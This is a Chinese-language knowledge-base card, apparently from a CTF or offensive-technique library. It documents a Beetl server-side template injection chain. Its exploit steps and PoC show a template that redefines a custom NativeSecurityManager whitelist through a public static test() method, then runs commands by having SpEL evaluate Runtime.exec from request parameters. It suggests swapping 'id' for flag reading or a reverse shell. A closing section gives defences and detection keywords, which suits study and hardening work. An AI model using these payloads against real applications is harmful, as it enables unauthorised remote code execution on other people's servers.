---
id: web-generic-ssti-beetl-custom-whitelist-static-test-mutation
title: Beetl 自定义白名单 NativeSecurityManager 被模板 public static test() 重写 callPattern 绕过，再 Beans.instantiate+SpEL RCE
type: scenario
domain: web
path: web/generic/ssti
technique: beetl-custom-whitelist-static-method-redefine-bypass
aliases:
- Beetl 白名单绕过
- NativeSecurityManager 绕过
- callPattern 重写
- WhiteListNativeSecurityManager
- Beans.instantiate SpEL
- Beetl 模板 RCE
tags:
- java
- beetl
- ssti
- template-injection
- whitelist-bypass
- security-manager
- static-method
- spel
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V413
  verified_at: '2026-11-09T15:22:44+08:00'
  notes: 已对照原文核对：自定义 WhiteListNativeSecurityManager 的 public static Pattern callPattern（非 final）+ public static test(String)→allow(split(",")) 重设白名单、模板 ${@nese.elephantcms.common.WhiteListNativeSecurityManager.test(...)} 自我扩权、Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue() 的 SpEL 命令执行，以及第二次须覆盖另一个模板的缓存坑，均与原文一致；exp.py 回显 flag{i_am_flag}。该卡为 --force 卡：与已验证卡 web-generic-ssti-beetl-static-class-reflect-runtime-blacklist-bypass（默认 4 类黑名单 + Class.forName 反射）相比，本卡是自定义白名单管理器被 public static test() 改写 callPattern 的自我扩权，触发条件/PoC 不同，区分成立。未验证点：WhiteListNativeSecurityManager 为靶场自定义类（confidence medium 合理），未复跑；affected_versions 已 --clear。
---

## 一句话结论

若应用为 Beetl 注册的是自定义白名单 `NativeSecurityManager`，其白名单保存在非 final 的 `public static Pattern callPattern` 中，并暴露了 `public static test(String)`（内部调用 `allow(split(","))` 重设白名单），那么模板里的 `${@该类.test('org.springframework,java.beans,...')}` 就能就地扩大白名单；随后用 `java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()` 创建 SpEL 解析器并求值，形成模板注入 RCE。

## 原理

- **Beetl 静态调用是设计能力**：`${@全限定类名.静态方法(...)}` 允许模板执行任意 Java 静态方法；因此“能写模板”通常等价于“能执行代码”，安全控制只能依赖 `NativeSecurityManager.permit()`。
- **自定义白名单的实现缺陷**：靶场的 `WhiteListNativeSecurityManager` 用静态字段 `public static Pattern callPattern` 保存允许的包/类正则，`permit()` 只检查目标类名是否匹配该正则。类本身位于允许的包 `venom.elephantcms` 下，所以模板可以调用它的 `public static test(String)`；`test()` 又调用 `allow(Arrays.asList(test.split(",")))` 重建 `callPattern`，且字段不是 final。模板因此可以“自我扩权”：
  ```text
  ${@nese.elephantcms.common.WhiteListNativeSecurityManager.test('org.springframework,java.beans,venom.elephantcms')}
  ```
- **为什么能 RCE**：白名单被扩大后，模板可以访问 `java.beans` 与 Spring 的类。`java.beans.Beans.instantiate(null, "org.springframework.expression.spel.standard.SpelExpressionParser")` 通过无参构造创建 SpEL 解析器；`parseExpression(parameter.b)` 解析请求参数 `b` 中的 SpEL 表达式，`getValue()` 求值。表达式 `new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('<cmd>').getInputStream()).next()` 即执行命令并取回显。
- **为什么用 Beans.instantiate**：某些模板安全控制会拦截 `new`/构造器/`Runtime` 直接引用；`Beans.instantiate` 是白名单内的工厂方法，SpEL 的 `T()` 类型引用与 `getRuntime()` 在 SpEL 求值阶段执行，绕开了“模板层只允许调用白名单类”的限制。
- **二次写入/缓存坑**：第一次写 `test.btl` 执行白名单重置后，第二次要覆盖另一个模板（如 `upload.btl`），否则模板缓存可能仍执行第一次的 payload。
- **根因**：安全管理者把“可变的授权状态”暴露成了模板可达的 public static 方法/字段；安全边界不应能被被约束方修改。

## 触发条件

- 应用使用 Beetl，并注册了自定义 `NativeSecurityManager`（白名单模式），模板可执行 `@` 静态调用。
- 攻击者能写入/修改 Beetl 模板（后台模板管理、任意文件写覆盖模板等）。
- 白名单管理者类中存在 public static 的“设置/测试/重置白名单”方法，或 `callPattern` 可被反射/直接赋值修改。
- 模板渲染时可携带攻击者可控的请求参数（`parameter.a`/`parameter.b`），且 classpath 存在 Spring 表达式相关类。
- 类名本身位于当前白名单允许的包内（否则第一步调用就被拒绝）。

## 利用步骤

1. 确认 Beetl 模板可写、`${@类.方法}` 可用；先写 `${@java.lang.Math.max(1,2)}` 验证渲染。
2. 找到白名单管理者类（错误信息、源码、依赖包名），确认其包名在白名单内，且存在 public static 的白名单重设方法/可变静态字段。
3. 第一次写模板（如 `test.btl`）：
   ```text
   ${@nese.elephantcms.common.WhiteListNativeSecurityManager.test('org.springframework,java.beans,venom.elephantcms')}
   ```
   访问该模板，若白名单被重置会正常渲染/返回 ok。
4. 第二次写另一个模板（如 `upload.btl`）：
   ```text
   ${@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()}
   ```
5. 访问 `/upload?a=org.springframework.expression.spel.standard.SpelExpressionParser&b=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()`，确认命令回显；把 `id` 换成读 flag/反弹 shell。

## PoC

```text
# 第一次：扩大白名单（类名/包名按目标替换）
${@nese.elephantcms.common.WhiteListNativeSecurityManager.test('org.springframework,java.beans,venom.elephantcms')}
```

```text
# 第二次：SpEL 求值执行命令
${@java.beans.Beans.instantiate(null,parameter.a).parseExpression(parameter.b).getValue()}
```

```http
GET /upload?a=org.springframework.expression.spel.standard.SpelExpressionParser&b=new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next() HTTP/1.1
Host: target
```

说明：模板表达式与参数结构按原文流程整理；类名/包名/模板路径需按目标替换。未在本机复跑。

## 变体与关联

- **默认 Beetl 黑名单绕过**：若没有自定义白名单，Beetl 默认只拦 `java.lang.Runtime/Process/ProcessBuilder/System` 四个类名，可用 `Class.forName` 反射绕过，见 [[web-generic-ssti-beetl-static-class-reflect-runtime-blacklist-bypass]]。
- **Beans.instantiate 作为通用工厂**：任何“禁止 new/构造器但允许静态方法”的模板沙箱，都可以尝试用 `Beans.instantiate` 创建带无参构造的危险类，再调用其方法。
- **SpEL 载体**：`SpelExpressionParser.parseExpression(...).getValue()` 是 Spring 生态的通用表达式执行入口；同类还有 `ExpressionParser` 接口的其他实现。
- **落地方式**：本链依赖“任意文件写覆盖模板”；若只能通过后台模板编辑，则需要管理员权限，可结合弱口令/CSRF。
- **边界**：白名单管理者类不可达、没有 public 的修改方法、白名单不可变（final/private 且无 setter）、Beetl 禁用 `@` 静态调用时，本链不成立。

## 检测与防御

- **设计**：安全管理者应使用不可变白名单（final、private、构造时固化），不暴露任何 public static 的 setter/test/reset 方法；不要把安全管理者类放在模板可访问的包内。
- **模板层**：禁用或严格限制 `${@类.方法}` 静态调用；模板编辑权限只给可信管理员，并配合审计；模板目录不可被普通文件写覆盖。
- **依赖**：移除不必要的 `java.beans`/Spring 表达式类暴露面；开启 Beetl 官方安全控制并升级到最新版。
- **检测**：模板中出现 `NativeSecurityManager`、`callPattern`、`Beans.instantiate`、`SpelExpressionParser`、`T(java.lang.Runtime)` 等关键字；模板文件在非发布窗口被修改；渲染进程加载异常类/执行子进程。
